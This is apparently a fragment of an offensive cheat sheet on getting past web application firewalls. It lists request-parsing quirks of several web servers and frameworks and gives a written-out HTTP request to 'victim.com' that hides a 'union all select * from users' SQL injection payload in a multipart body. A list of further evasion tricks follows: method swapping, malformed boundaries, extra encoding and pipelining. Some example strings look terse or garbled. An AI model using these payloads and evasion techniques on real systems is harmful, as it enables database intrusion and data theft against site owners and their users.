


Some examples to start with: 
```
&==; – Python Django between parameters! 
FooB==POST verb – Apache with PHP 
<%I%M%u011e>== – IIS ASP Classic 
;/path1;foo/path2;bar/;==/path1/path2/ – Apache Tomcat
```
- change request METHOD : POST with GET
- use `Content-Type: multipart/form-data; boundary=1`
```HTTP
GET /path/sample.aspx?input0=0 HTTP/1.1 
HOST: victim.com 
Content-Type: multipart/form-data; boundary=1 
Content-Length: 95 

--1 
Content-Disposition: form-data; name="input1"

'union all select * from users-- 
--1--
```
- remove parts from the body such as `form-data` | last `--` in boundary
- add useless parts such as `filename=foo` in content-disposition
- more encoding
- pipeline requests 'multiple-request' in one request